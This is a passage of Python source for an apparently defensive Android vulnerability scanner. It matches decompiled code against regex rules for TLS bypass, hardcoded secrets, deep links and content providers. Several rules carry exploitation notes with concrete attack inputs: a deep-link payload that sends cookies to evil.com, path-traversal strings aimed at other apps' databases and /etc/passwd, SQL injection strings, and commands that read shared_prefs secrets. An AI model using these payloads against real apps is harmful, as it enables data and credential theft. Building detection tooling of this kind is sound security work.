            "pattern": r'sendBroadcast\s*\(\s*[^,)]+\s*\)',
            "title": "Broadcast Without Permission",
            "severity": "medium",
            "category": "Information Disclosure",
            "cwe": "CWE-925",
            "description": "Broadcast sent without permission - any app can receive it",
            "exploitation": """1. Create a BroadcastReceiver for the action
2. Register it and capture the broadcast data
3. May contain sensitive information like tokens, user data""",
            "remediation": "Use LocalBroadcastManager or sendBroadcast(intent, permission)"
        },
        {
            "pattern": r'registerReceiver\s*\([^,]+,\s*new\s+IntentFilter\s*\([^)]+\)\s*\)',
            "title": "Dynamic Broadcast Receiver",
            "severity": "low",
            "category": "Intent Spoofing",
            "cwe": "CWE-925",
            "description": "Dynamically registered receiver without permission check",
            "exploitation": "Any app can send broadcasts matching the IntentFilter",
            "remediation": "Register with permission parameter or use LocalBroadcastManager"
        },
        {
            "pattern": r'startActivity\s*\(\s*new\s+Intent\s*\([^)]*\)\s*\)',
            "title": "Implicit Intent",
            "severity": "low",
            "category": "Intent Hijacking",
            "cwe": "CWE-927",
            "description": "Implicit intent can be intercepted by malicious apps",
            "exploitation": "Register IntentFilter for the action and intercept the intent data",
            "remediation": "Use explicit intents with setComponent() or setPackage()"
        },
    ]
    
    for file_path in files:
        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
            lines = content.split('\n')
            rel_path = str(file_path.relative_to(sources_dir))
            class_name = file_path.stem
            
            if not any(x in content for x in ['Intent', 'PendingIntent', 'Broadcast', 'startActivity']):
                continue
            
            for p in patterns:
                for match in re.finditer(p["pattern"], content):
                    line_num = content[:match.start()].count('\n') + 1
                    line_idx = line_num - 1
                    before, current, after = _get_code_context(lines, line_idx)
                    
                    findings.append({
                        "scanner": "intent_injection",
                        "category": p["category"],
                        "severity": p["severity"],
                        "title": p["title"],
                        "description": p["description"],
                        "class_name": class_name,
                        "file_path": rel_path,
                        "line_number": line_num,
                        "code_snippet": current,
                        "context_before": before,
                        "context_after": after,
                        "exploitation": p["exploitation"],
                        "remediation": p["remediation"],
                        "cwe_id": p.get("cwe"),
                        "confidence": "medium",
                    })
        except Exception as e:
            logger.debug(f"Error scanning {file_path}: {e}")
    
    return findings


def _scan_file_operations(files: List[Path], sources_dir: Path) -> List[Dict[str, Any]]:
    """Scan for insecure file operations - path traversal, world-readable files."""
    findings = []
    
    patterns = [
        {
            "pattern": r'new\s+File\s*\([^)]*\+',
            "title": "Dynamic File Path Construction",
            "severity": "high",
            "category": "Path Traversal",
            "cwe": "CWE-22",
            "description": "File path constructed with concatenation - potential path traversal",
            "exploitation": """1. Find the input source
2. Inject: ../../../data/data/other.app/shared_prefs/prefs.xml
3. Can read other apps' data or system files readable by app""",
            "remediation": "Use getCanonicalPath() and verify path starts with expected directory"
        },
        {
            "pattern": r'openFileOutput\s*\([^,]+,\s*MODE_WORLD_READABLE',
            "title": "World-Readable File",
            "severity": "critical",
            "category": "Insecure Storage",
            "cwe": "CWE-732",
            "description": "File created with world-readable permissions",
            "exploitation": "Any app can read this file. Check what sensitive data is written to it.",
            "remediation": "Use MODE_PRIVATE. Share data via ContentProvider with permissions."
        },
        {
            "pattern": r'openFileOutput\s*\([^,]+,\s*MODE_WORLD_WRITEABLE',
            "title": "World-Writable File",
            "severity": "critical",
            "category": "Insecure Storage",
            "cwe": "CWE-732",
            "description": "File created with world-writable permissions",
            "exploitation": "Any app can modify this file. Can inject malicious data that app trusts.",
            "remediation": "Use MODE_PRIVATE. Never use world-writable files."
        },
        {
            "pattern": r'getExternalStorageDirectory|getExternalFilesDir',
            "title": "External Storage Used",
            "severity": "medium",
            "category": "Insecure Storage",
            "cwe": "CWE-921",
            "description": "Data stored on external storage accessible by other apps",
            "exploitation": "With READ_EXTERNAL_STORAGE permission, any app can read this data.",
            "remediation": "Encrypt sensitive data before writing to external storage. Use internal storage for sensitive files."
        },
        {
            "pattern": r'Environment\.getExternalStoragePublicDirectory',
            "title": "Public External Storage",
            "severity": "high",
            "category": "Insecure Storage",
            "cwe": "CWE-921",
            "description": "Data written to public external storage",
            "exploitation": "Any app or user can read and modify files in public directories.",
            "remediation": "Use app-specific external storage or internal storage."
        },
    ]
    
    for file_path in files:
        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
            lines = content.split('\n')
            rel_path = str(file_path.relative_to(sources_dir))
            class_name = file_path.stem
            
            if not any(x in content for x in ['File', 'openFile', 'External', 'Storage', 'FileOutputStream']):
                continue
            
            for p in patterns:
                for match in re.finditer(p["pattern"], content):
                    line_num = content[:match.start()].count('\n') + 1
                    line_idx = line_num - 1
                    before, current, after = _get_code_context(lines, line_idx)
                    
                    findings.append({
                        "scanner": "file_operations",
                        "category": p["category"],
                        "severity": p["severity"],
                        "title": p["title"],
                        "description": p["description"],
                        "class_name": class_name,
                        "file_path": rel_path,
                        "line_number": line_num,
                        "code_snippet": current,
                        "context_before": before,
                        "context_after": after,
                        "exploitation": p["exploitation"],
                        "remediation": p["remediation"],
                        "cwe_id": p.get("cwe"),
                        "confidence": "high",
                    })
        except Exception as e:
            logger.debug(f"Error scanning {file_path}: {e}")
    
    return findings


def _scan_network_security(files: List[Path], sources_dir: Path) -> List[Dict[str, Any]]:
    """Scan for network security issues - SSL bypass, cleartext, cert pinning."""
    findings = []
    
    patterns = [
        {
            "pattern": r'TrustManager\s*\[\s*\]\s*\{[^}]*checkServerTrusted[^}]*\{\s*\}',
            "title": "TrustManager Bypass",
            "severity": "critical",
            "category": "SSL/TLS Bypass",
            "cwe": "CWE-295",
            "description": "Empty TrustManager implementation accepts any certificate",
            "exploitation": """1. Perform MitM attack with self-signed certificate
2. Intercept and modify all HTTPS traffic
3. Steal credentials, tokens, personal data""",
            "remediation": "Remove custom TrustManager. Use default certificate validation or implement proper pinning."
        },
        {
            "pattern": r'ALLOW_ALL_HOSTNAME_VERIFIER|AllowAllHostnameVerifier',
            "title": "Hostname Verification Disabled",
            "severity": "critical",
            "category": "SSL/TLS Bypass",
            "cwe": "CWE-297",
            "description": "Hostname verification is disabled",
            "exploitation": "Attacker can present any valid certificate and perform MitM",
            "remediation": "Use default hostname verifier or implement strict verification"
        },
        {
            "pattern": r'setHostnameVerifier\s*\([^)]*\{\s*return\s+true',
            "title": "Hostname Verifier Always Returns True",
            "severity": "critical",
            "category": "SSL/TLS Bypass",
            "cwe": "CWE-297",
            "description": "Custom hostname verifier accepts any hostname",
            "exploitation": "MitM attack with any certificate will succeed",
            "remediation": "Use strict hostname verification"
        },
        {
            "pattern": r'http://[a-zA-Z0-9]',
            "title": "Cleartext HTTP URL",
            "severity": "medium",
            "category": "Cleartext Traffic",
            "cwe": "CWE-319",
            "description": "HTTP URL found - traffic can be intercepted",
            "exploitation": "Perform MitM attack to intercept/modify traffic without needing to break SSL",
            "remediation": "Use HTTPS for all network communication"
        },
        {
            "pattern": r'\.setSSLSocketFactory\s*\(',
            "title": "Custom SSL Socket Factory",
            "severity": "medium",
            "category": "SSL/TLS Configuration",
            "cwe": "CWE-295",
            "description": "Custom SSL socket factory - may disable security checks",
            "exploitation": "Review the SSLSocketFactory implementation for security bypasses",
            "remediation": "Use default SSL configuration unless implementing cert pinning"
        },
        {
            "pattern": r'onReceivedSslError[^}]*\.proceed\s*\(',
            "title": "WebView SSL Error Ignored",
            "severity": "critical",
            "category": "SSL/TLS Bypass",
            "cwe": "CWE-295",
            "description": "WebView SSL errors are ignored with handler.proceed()",
            "exploitation": "MitM attack on WebView traffic will succeed",
            "remediation": "Call handler.cancel() on SSL errors. Don't override onReceivedSslError to proceed."
        },
    ]
    
    for file_path in files:
        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
            lines = content.split('\n')
            rel_path = str(file_path.relative_to(sources_dir))
            class_name = file_path.stem
            
            # Skip checking http:// in certain files that won't have network code
            has_network = any(x in content for x in ['TrustManager', 'HostnameVerifier', 'SSLSocket', 'HttpClient', 'URL', 'WebView'])
            
            for p in patterns:
                # Skip cleartext check if no network code
                if 'http://' in p["pattern"] and not has_network:
                    continue
                    
                for match in re.finditer(p["pattern"], content, re.DOTALL if 'TrustManager' in p["pattern"] else 0):
                    # Filter out false positives for cleartext
                    if 'http://' in p["pattern"]:
                        matched_text = match.group()
                        if any(x in matched_text.lower() for x in ['localhost', '127.0.0.1', '10.0.2.2', 'example', 'schema', 'xmlns']):
                            continue
                    
                    line_num = content[:match.start()].count('\n') + 1
                    line_idx = line_num - 1
                    before, current, after = _get_code_context(lines, line_idx)
                    
                    findings.append({
                        "scanner": "network_security",
                        "category": p["category"],
                        "severity": p["severity"],
                        "title": p["title"],
                        "description": p["description"],
                        "class_name": class_name,
                        "file_path": rel_path,
                        "line_number": line_num,
                        "code_snippet": current,
                        "context_before": before,
                        "context_after": after,
                        "exploitation": p["exploitation"],
                        "remediation": p["remediation"],
                        "cwe_id": p.get("cwe"),
                        "confidence": "high" if "critical" in p["severity"] else "medium",
                    })
        except Exception as e:
            logger.debug(f"Error scanning {file_path}: {e}")
    
    return findings


def _scan_authentication_issues(files: List[Path], sources_dir: Path) -> List[Dict[str, Any]]:
    """Scan for authentication and credential issues."""
    findings = []
    
    patterns = [
        {
            "pattern": r'(?i)(password|passwd|pwd)\s*=\s*["\'][^"\']{4,}["\']',
            "title": "Hardcoded Password",
            "severity": "critical",
            "category": "Hardcoded Credentials",
            "cwe": "CWE-798",
            "description": "Password hardcoded in source code",
            "exploitation": "Extract password from decompiled code and use it directly",
            "remediation": "Remove hardcoded passwords. Use Android Keystore or prompt user."
        },
        {
            "pattern": r'(?i)api[_-]?key\s*=\s*["\'][A-Za-z0-9_\-]{16,}["\']',
            "title": "Hardcoded API Key",
            "severity": "high",
            "category": "Hardcoded Credentials",
            "cwe": "CWE-798",
            "description": "API key hardcoded in source code",
            "exploitation": "Extract API key and use it to access the service with app's privileges",
            "remediation": "Move to secure storage or server-side. Use build config for non-sensitive keys."
        },
        {
            "pattern": r'(?i)secret\s*=\s*["\'][A-Za-z0-9_\-]{16,}["\']',
            "title": "Hardcoded Secret",
            "severity": "high",
            "category": "Hardcoded Credentials",
            "cwe": "CWE-798",
            "description": "Secret value hardcoded in source code",
            "exploitation": "Extract and use the secret for authentication or decryption",
            "remediation": "Use Android Keystore or secure server-side storage"
        },
        {
            "pattern": r'(?i)Bearer\s+[A-Za-z0-9_\-\.]+',
            "title": "Hardcoded Bearer Token",
            "severity": "critical",
            "category": "Hardcoded Credentials",
            "cwe": "CWE-798",
            "description": "Bearer token hardcoded in source code",
            "exploitation": "Use token directly for API authentication",
            "remediation": "Tokens should be obtained at runtime and stored securely"
        },
        {
            "pattern": r'(?i)putString\s*\(\s*["\'](?:password|token|secret|key|auth)',
            "title": "Sensitive Data in SharedPreferences",
            "severity": "high",
            "category": "Insecure Storage",
            "cwe": "CWE-312",
            "description": "Sensitive data stored in SharedPreferences without encryption",
            "exploitation": "On rooted device: cat /data/data/package/shared_prefs/*.xml",
            "remediation": "Use EncryptedSharedPreferences or Android Keystore"
        },
        {
            "pattern": r'(?i)\.equals\s*\(\s*(?:password|passwd|pin)',
            "title": "String Comparison for Authentication",
            "severity": "medium",
            "category": "Authentication Bypass",
            "cwe": "CWE-208",
            "description": "Using String.equals() for password comparison - timing attack possible",
            "exploitation": "Measure response times to determine correct password characters",
            "remediation": "Use MessageDigest.isEqual() or constant-time comparison"
        },
    ]
    
    for file_path in files:
        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
            lines = content.split('\n')
            rel_path = str(file_path.relative_to(sources_dir))
            class_name = file_path.stem
            
            for p in patterns:
                for match in re.finditer(p["pattern"], content):
                    # Filter false positives
                    matched_text = match.group()
                    if any(x in matched_text.lower() for x in ['example', 'test', 'mock', 'fake', 'dummy', 'sample', 'placeholder', '""', "''"]):
                        continue
                    
                    line_num = content[:match.start()].count('\n') + 1
                    line_idx = line_num - 1
                    before, current, after = _get_code_context(lines, line_idx)
                    
                    findings.append({
                        "scanner": "authentication",
                        "category": p["category"],
                        "severity": p["severity"],
                        "title": p["title"],
                        "description": p["description"],
                        "class_name": class_name,
                        "file_path": rel_path,
                        "line_number": line_num,
                        "code_snippet": current,
                        "context_before": before,
                        "context_after": after,
                        "exploitation": p["exploitation"],
                        "remediation": p["remediation"],
                        "cwe_id": p.get("cwe"),
                        "confidence": "high",
                    })
        except Exception as e:
            logger.debug(f"Error scanning {file_path}: {e}")
    
    return findings


def _scan_logging_exposure(files: List[Path], sources_dir: Path) -> List[Dict[str, Any]]:
    """Scan for sensitive data in logs."""
    findings = []
    
    # Look for logging of sensitive data
    sensitive_patterns = [
        (r'(?i)Log\.[divwe]\s*\([^,]+,\s*[^)]*(?:password|passwd|pwd|secret|token|key|auth|credential|bearer)', 'Password/Token Logged'),
        (r'(?i)Log\.[divwe]\s*\([^,]+,\s*[^)]*(?:ssn|social.?security|credit.?card|cvv|pin)', 'PII Logged'),
        (r'(?i)System\.out\.print.*(?:password|secret|token|key)', 'Sensitive Data in stdout'),
        (r'printStackTrace\s*\(\s*\)', 'Stack Trace Printed'),
        (r'e\.getMessage\s*\(\s*\)', 'Exception Message Exposed'),
    ]
    
    for file_path in files:
        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
            lines = content.split('\n')
            rel_path = str(file_path.relative_to(sources_dir))
            class_name = file_path.stem
            
            if not any(x in content for x in ['Log.', 'System.out', 'printStackTrace', 'getMessage']):
                continue
            
            for pattern, title in sensitive_patterns:
                for match in re.finditer(pattern, content):
                    line_num = content[:match.start()].count('\n') + 1
                    line_idx = line_num - 1
                    before, current, after = _get_code_context(lines, line_idx)
                    
                    severity = "high" if 'password' in title.lower() or 'token' in title.lower() else "medium"
                    
                    findings.append({
                        "scanner": "logging_exposure",
                        "category": "Information Disclosure",
                        "severity": severity,
                        "title": title,
                        "description": f"Potentially sensitive data written to logs",
                        "class_name": class_name,
                        "file_path": rel_path,
                        "line_number": line_num,
                        "code_snippet": current,
                        "context_before": before,
                        "context_after": after,
                        "exploitation": "On rooted device: adb logcat | grep package_name",
                        "remediation": "Remove sensitive data from logs. Use ProGuard to strip Log calls in release builds.",
                        "cwe_id": "CWE-532",
                        "confidence": "medium",
                    })
        except Exception as e:
            logger.debug(f"Error scanning {file_path}: {e}")
    
    return findings


def _scan_kotlin_security(files: List[Path], sources_dir: Path) -> List[Dict[str, Any]]:
    """Scan for Kotlin-specific security vulnerabilities."""
    findings = []
    
    patterns = [
        # lateinit misuse - can cause crashes and security issues
        {
            "pattern": r'lateinit\s+var\s+(\w+)\s*:\s*(String|ByteArray|Key|Secret|Password|Token|Credential)',
            "title": "Sensitive Data in lateinit",
            "severity": "medium",
            "category": "Memory Safety",
            "cwe": "CWE-457",
            "description": "Sensitive data stored in lateinit var may not be properly cleared and can cause UninitializedPropertyAccessException",
            "exploitation": """1. lateinit vars remain in memory until object is GC'd
2. Crash the app to dump memory if lateinit is accessed before initialization
3. Sensitive data may be exposed in crash dumps""",
            "remediation": "Use nullable types with proper null handling for sensitive data. Clear sensitive data after use."
        },
        # Unsafe cast with as - can be exploited for type confusion
        {
            "pattern": r'\bas\s+(String|Int|Boolean|Any)\b(?!\?)',
            "title": "Unsafe Kotlin Cast",
            "severity": "low",
            "category": "Type Safety",
            "cwe": "CWE-704",
            "description": "Unsafe cast with 'as' throws ClassCastException if type doesn't match",
            "exploitation": "Send unexpected type data to cause ClassCastException and potential DoS",
            "remediation": "Use safe cast 'as?' with null check, or 'is' type check before casting"
        },
        # Unconfined dispatcher - security risk in coroutines
        {
            "pattern": r'Dispatchers\.Unconfined|newSingleThreadContext|newFixedThreadPoolContext',
            "title": "Dangerous Coroutine Dispatcher",
            "severity": "medium",
            "category": "Concurrency",
            "cwe": "CWE-362",
            "description": "Unconfined dispatcher or custom thread contexts can lead to race conditions and security issues",
            "exploitation": """1. Unconfined dispatcher continues on any thread - unpredictable behavior
2. Can lead to race conditions in security-critical code
3. May bypass Android's main thread security checks""",
            "remediation": "Use Dispatchers.IO for I/O, Dispatchers.Default for CPU, Dispatchers.Main for UI. Avoid Unconfined."
        },
        # GlobalScope - coroutine leak risk
        {
            "pattern": r'GlobalScope\.launch|GlobalScope\.async',
            "title": "GlobalScope Coroutine",
            "severity": "medium",
            "category": "Resource Leak",
            "cwe": "CWE-404",
            "description": "GlobalScope coroutines are not bound to lifecycle and can leak resources/data",
            "exploitation": """1. Coroutines in GlobalScope continue after Activity/Fragment is destroyed
2. May hold references to sensitive context data
3. Network requests may complete after user logs out""",
            "remediation": "Use lifecycleScope, viewModelScope, or create custom CoroutineScope tied to component lifecycle"
        },
        # runBlocking in Android - can cause ANR and deadlocks
        {
            "pattern": r'runBlocking\s*\{',
            "title": "runBlocking on Android",
            "severity": "high",
            "category": "Denial of Service",
            "cwe": "CWE-833",
            "description": "runBlocking blocks the current thread - if called on main thread causes ANR",
            "exploitation": """1. If on main thread: ANR (Application Not Responding) after 5 seconds
2. Can be triggered by making the suspending operation slow
3. Causes poor UX and potential data loss""",
            "remediation": "Use suspend functions with proper coroutine scope, or use callback-based approach"
        },
        # Kotlin serialization without validation
        {
            "pattern": r'Json\.decodeFromString<|@Serializable\s+(?:data\s+)?class\s+\w+.*(?:var|val)\s+\w+\s*:\s*(?:String|Any)',
            "title": "Kotlin Serialization Without Validation",
            "severity": "medium",
            "category": "Deserialization",
            "cwe": "CWE-502",
            "description": "Kotlin serialization may deserialize untrusted data without validation",
            "exploitation": """1. Send malformed JSON to cause parsing exceptions
2. Inject unexpected values into data classes
3. If custom serializers are used, may have RCE potential""",
            "remediation": "Validate all deserialized data. Use coerceInputValues for lenient parsing. Sanitize before use."
        },
        # Reflection in Kotlin
        {
            "pattern": r'::class\.java|javaClass|::class\.createInstance|KClass|declaredMemberProperties|declaredFunctions',
            "title": "Kotlin Reflection Usage",
            "severity": "low",
            "category": "Information Disclosure",
            "cwe": "CWE-470",
            "description": "Kotlin reflection can expose internal class structure",
            "exploitation": """1. Reflection exposes private members
2. Can be used to bypass access controls
3. May leak internal API structure""",
            "remediation": "Minimize reflection use. Use @JvmSynthetic or internal visibility. Apply ProGuard/R8 obfuscation."
        },
        # by lazy with unsafe mode
        {
            "pattern": r'by\s+lazy\s*\(\s*LazyThreadSafetyMode\.NONE\s*\)',
            "title": "Unsafe Lazy Initialization",
            "severity": "medium",
            "category": "Concurrency",
            "cwe": "CWE-362",
            "description": "LazyThreadSafetyMode.NONE is not thread-safe and can cause race conditions",
            "exploitation": """1. Multiple threads may initialize the lazy value
2. Can lead to duplicate initialization of security-critical objects
3. Race condition in double-checked locking scenarios""",
            "remediation": "Use default lazy{} (synchronized) or LazyThreadSafetyMode.PUBLICATION for thread safety"
        },
        # inline class/value class exposing sensitive data
        {
            "pattern": r'@JvmInline\s+value\s+class\s+\w*(Password|Secret|Key|Token|Credential)',
            "title": "Sensitive Inline Class",
            "severity": "low",
            "category": "Information Disclosure",
            "cwe": "CWE-200",
            "description": "Inline/value classes are unboxed at runtime - may expose underlying value",
            "exploitation": "Inline classes don't provide runtime encapsulation - underlying value may appear in logs/debugger",
            "remediation": "Use regular classes for sensitive data to ensure encapsulation at runtime"
        },
        # object declarations with mutable state (singleton issues)
        {
            "pattern": r'object\s+\w+.*\{\s*(?:.*\n)*?\s*var\s+\w+\s*:\s*(?:String|ByteArray|Key|Token|MutableList|MutableMap)',
            "title": "Mutable Singleton State",
            "severity": "medium",
            "category": "Shared State",
            "cwe": "CWE-362",
            "description": "Kotlin object with mutable state is a global singleton - shared across the app",
            "exploitation": """1. Singleton state persists across activities/sessions
2. Previous user's data may leak to next user if not cleared
3. Race conditions if accessed from multiple threads""",
            "remediation": "Use val instead of var. Clear sensitive data on logout. Consider dependency injection instead."
        },
        # Channel or Flow without proper error handling
        {
            "pattern": r'\.collect\s*\{[^}]*\}(?!\s*\.catch)',
            "title": "Flow Without Error Handling",
            "severity": "low",
            "category": "Error Handling",
            "cwe": "CWE-755",
            "description": "Kotlin Flow collection without catch operator may crash on exceptions",
            "exploitation": "Send malformed data through the flow to cause unhandled exception",
            "remediation": "Add .catch { } operator before .collect, or use try-catch around collect"
        },
        # companion object with sensitive constants
        {
            "pattern": r'companion\s+object\s*\{[^}]*(?:const\s+val|val)\s+\w*(KEY|SECRET|PASSWORD|TOKEN|API_KEY|PRIVATE)\s*=\s*"[^"]+"',
            "title": "Hardcoded Secret in Companion Object",
            "severity": "critical",
            "category": "Hardcoded Credentials",
            "cwe": "CWE-798",
            "description": "Sensitive value hardcoded in companion object constant",
            "exploitation": "Extract constant from decompiled code - companion object vals are compiled as static fields",
            "remediation": "Move secrets to BuildConfig, encrypted storage, or retrieve from secure backend"
        },
        # sealed class when not exhaustive (before Kotlin 1.7)
        {
            "pattern": r'when\s*\([^)]+\)\s*\{(?:(?!else\s*->)[^}])*\}',
            "title": "Potentially Non-Exhaustive When",
            "severity": "low",
            "category": "Logic Error",
            "cwe": "CWE-478",
            "description": "when expression without else may miss cases if used with non-sealed types",
            "exploitation": "Pass unexpected subtype to cause NoWhenBranchMatchedException",
            "remediation": "Add else branch for safety, or use sealed classes/enums for exhaustive when"
        },
        # suspend function accessing UI
        {
            "pattern": r'suspend\s+fun\s+\w+[^{]*\{[^}]*(?:setText|setImage|visibility|adapter|recyclerView|textView|imageView)',
            "title": "Suspend Function Accessing UI",
            "severity": "medium",
            "category": "Thread Safety",
            "cwe": "CWE-362",
            "description": "Suspend function may access UI from wrong thread if dispatcher is not Main",
            "exploitation": "May cause CalledFromWrongThreadException crash or UI inconsistency",
            "remediation": "Use withContext(Dispatchers.Main) {} for UI operations, or ensure launch is on Main dispatcher"
        },
    ]
    
    # Also scan .kt files specifically
    kt_files = [f for f in files if f.suffix == '.java' or f.suffix == '.kt']
    # JADX decompiles to .java but preserves Kotlin patterns
    
    for file_path in kt_files:
        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
            lines = content.split('\n')
            rel_path = str(file_path.relative_to(sources_dir))
            class_name = file_path.stem
            
            # Quick check for Kotlin patterns
            if not any(x in content for x in ['lateinit', 'suspend ', 'Dispatchers.', 'GlobalScope', 
                                               'runBlocking', 'companion object', 'by lazy', 
                                               '@Serializable', 'Flow<', 'Channel<', 'object ',
                                               '::class', 'as ', 'LazyThreadSafetyMode']):
                continue
            
            for p in patterns:
                for match in re.finditer(p["pattern"], content, re.MULTILINE | re.DOTALL):
                    line_num = content[:match.start()].count('\n') + 1
                    line_idx = line_num - 1
                    before, current, after = _get_code_context(lines, line_idx)
                    
                    findings.append({
                        "scanner": "kotlin_security",
                        "category": p["category"],
                        "severity": p["severity"],
                        "title": p["title"],
                        "description": p["description"],
                        "class_name": class_name,
                        "file_path": rel_path,
                        "line_number": line_num,
                        "code_snippet": current,
                        "context_before": before,
                        "context_after": after,
                        "exploitation": p["exploitation"],
                        "remediation": p["remediation"],
                        "cwe_id": p.get("cwe"),
                        "confidence": "medium",
                    })
        except Exception as e:
            logger.debug(f"Error scanning {file_path} for Kotlin patterns: {e}")
    
    return findings


def _scan_deep_link_security(files: List[Path], sources_dir: Path) -> List[Dict[str, Any]]:
    """Scan for deep link and app link security vulnerabilities."""
    findings = []
    
    patterns = [
        # Deep link intent handling without validation
        {
            "pattern": r'getIntent\s*\(\s*\)\.getData\s*\(\s*\)\.get(QueryParameter|Path|Host|Scheme)',
            "title": "Deep Link Parameter Extraction",
            "severity": "medium",
            "category": "Deep Link Injection",
            "cwe": "CWE-601",
            "description": "Deep link parameters extracted without validation - potential injection point",
            "exploitation": """1. Craft malicious deep link: myapp://action?redirect=http://evil.com
2. Test for open redirect: myapp://login?next=javascript:alert(1)
3. Path traversal: myapp://files?path=../../../private
4. Send via: adb shell am start -d "myapp://..." """,
            "remediation": "Validate all deep link parameters. Whitelist allowed hosts/paths. Never use deep link data in WebView.loadUrl() directly."
        },
        # Deep link with loadUrl - XSS risk
        {
            "pattern": r'loadUrl\s*\([^)]*getData\s*\(\s*\)|loadUrl\s*\([^)]*getQueryParameter',
            "title": "Deep Link to WebView XSS",
            "severity": "critical",
            "category": "Cross-Site Scripting",
            "cwe": "CWE-79",
            "description": "Deep link URL loaded directly in WebView without validation",
            "exploitation": """1. Send: adb shell am start -d "myapp://open?url=javascript:document.location='http://evil.com?c='+document.cookie"
2. Or: myapp://webview?url=file:///data/data/pkg/shared_prefs/secrets.xml
3. Steal tokens, cookies, or local files""",
            "remediation": "Never load deep link URLs in WebView. Validate URL scheme (https only) and domain whitelist."
        },
        # Deep link starting activities
        {
            "pattern": r'startActivity\s*\([^)]*getData\s*\(\s*\)|startActivity\s*\([^)]*getIntent\s*\(\s*\)\.get',
            "title": "Deep Link Activity Launch",
            "severity": "high",
            "category": "Intent Injection",
            "cwe": "CWE-940",
            "description": "Deep link data used to start activities - may launch unintended components",
            "exploitation": """1. Inject class name: myapp://start?activity=com.secret.AdminActivity
2. Launch exported activities with elevated privileges
3. Bypass authentication flows""",
            "remediation": "Use allowlist of permitted activities. Never construct Intent from deep link strings directly."
        },
        # Custom scheme handler
        {
            "pattern": r'scheme\s*=\s*["\'](?!https?://)[a-z]+["\']|<data\s+android:scheme=["\'](?!https?)[a-z]+["\']',
            "title": "Custom URL Scheme Handler",
            "severity": "low",
            "category": "Deep Link Configuration",
            "cwe": "CWE-749",
            "description": "Custom URL scheme registered - can be invoked by any app or webpage",
            "exploitation": """1. Any app can trigger custom scheme links
2. Malicious website can redirect to custom scheme
3. Scheme hijacking if another app registers same scheme""",
            "remediation": "Prefer App Links (https with assetlinks.json) over custom schemes. Validate data from all deep links."
        },
        # Deep link file access
        {
            "pattern": r'new\s+File\s*\([^)]*getQueryParameter|openFileInput\s*\([^)]*getData',
            "title": "Deep Link Path Traversal",
            "severity": "critical",
            "category": "Path Traversal",
            "cwe": "CWE-22",
            "description": "File path constructed from deep link parameter",
            "exploitation": """1. myapp://files?name=../../../data/data/com.other.app/databases/secrets.db
2. myapp://download?path=/etc/passwd
3. Access files outside intended directory""",
            "remediation": "Use canonical path validation. Never construct file paths from deep link data. Use content providers."
        },
        # Deep link SQL query
        {
            "pattern": r'rawQuery\s*\([^)]*getQueryParameter|selection\s*=\s*[^+]*\+\s*[^+]*getData',
            "title": "Deep Link SQL Injection",
            "severity": "critical",
            "category": "SQL Injection",
            "cwe": "CWE-89",
            "description": "Deep link parameter used in SQL query",
            "exploitation": """1. myapp://search?q=' OR '1'='1' --
2. myapp://user?id=1 UNION SELECT * FROM credentials --
3. Dump database contents""",
            "remediation": "Use parameterized queries. Never concatenate deep link data into SQL strings."
        },
        # Navigation component deep link
        {
            "pattern": r'<deepLink\s+app:uri=["\'][^"\']+\{[^}]+\}|navDeepLink\s*\{[^}]*uriPattern',
            "title": "Navigation Deep Link Pattern",
            "severity": "low",
            "category": "Deep Link Configuration",
            "cwe": "CWE-749",
            "description": "Navigation component deep link with parameters - verify argument validation",
            "exploitation": "Parameters from deep link URI are passed as navigation arguments - validate in destination",
            "remediation": "Validate navigation arguments in destination fragment. Use SafeArgs for type-safe arguments."
        },
        # JavaScript bridge from deep link
        {
            "pattern": r'evaluateJavascript\s*\([^)]*getQueryParameter|loadUrl\s*\(\s*["\']javascript:.*getQueryParameter',
            "title": "Deep Link JavaScript Injection",
            "severity": "critical",
            "category": "Code Injection",
            "cwe": "CWE-94",
            "description": "Deep link parameter injected into JavaScript execution",
            "exploitation": """1. myapp://run?code=alert(document.cookie)
2. Inject arbitrary JavaScript into WebView
3. Steal sensitive data, perform actions as user""",
            "remediation": "Never execute JavaScript from deep link data. Sanitize all inputs if absolutely necessary."
        },
    ]
    
    for file_path in files:
        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
            lines = content.split('\n')
            rel_path = str(file_path.relative_to(sources_dir))
            class_name = file_path.stem
            
            # Quick check for deep link related code
            if not any(x in content for x in ['getData()', 'getQueryParameter', 'deepLink', 
                                               'scheme=', 'android:scheme', 'navDeepLink',
                                               'onNewIntent', 'ACTION_VIEW']):
                continue
            
            for p in patterns:
                for match in re.finditer(p["pattern"], content, re.MULTILINE):
                    line_num = content[:match.start()].count('\n') + 1
                    line_idx = line_num - 1
                    before, current, after = _get_code_context(lines, line_idx)
                    
                    findings.append({
                        "scanner": "deep_link_security",
                        "category": p["category"],
                        "severity": p["severity"],
                        "title": p["title"],
                        "description": p["description"],
                        "class_name": class_name,
                        "file_path": rel_path,
                        "line_number": line_num,
                        "code_snippet": current,
                        "context_before": before,
                        "context_after": after,
                        "exploitation": p["exploitation"],
                        "remediation": p["remediation"],
                        "cwe_id": p.get("cwe"),
                        "confidence": "medium",
                    })
        except Exception as e:
            logger.debug(f"Error scanning {file_path} for deep link patterns: {e}")
    
    return findings


def _scan_content_provider_security(files: List[Path], sources_dir: Path) -> List[Dict[str, Any]]:
    """Scan for Content Provider security vulnerabilities."""
    findings = []
    
    patterns = [
        # Exported content provider (from code patterns)
        {
            "pattern": r'class\s+\w+\s+extends\s+ContentProvider|@Override\s*\n\s*public\s+Cursor\s+query\s*\(',
            "title": "Content Provider Implementation",
            "severity": "info",
            "category": "Content Provider",
            "cwe": "CWE-926",
            "description": "Content Provider found - verify export and permission settings in manifest",
            "exploitation": "If exported without permissions, any app can query/modify data",
            "remediation": "Set android:exported=false or require permissions with android:permission attribute"
        },
        # SQL injection in query
        {
            "pattern": r'public\s+Cursor\s+query[^{]+\{[^}]*rawQuery\s*\([^,]*\+|query\s*\([^)]+selection\s*\+',
            "title": "Content Provider SQL Injection",
            "severity": "critical",
            "category": "SQL Injection",
            "cwe": "CWE-89",
            "description": "String concatenation in Content Provider query - SQL injection vulnerability",
            "exploitation": """1. content://provider/table?projection=* FROM credentials --
2. Use ContentResolver.query() with malicious selection args
3. Example: adb shell content query --uri content://provider --where "1=1 OR name LIKE '%'\" """,
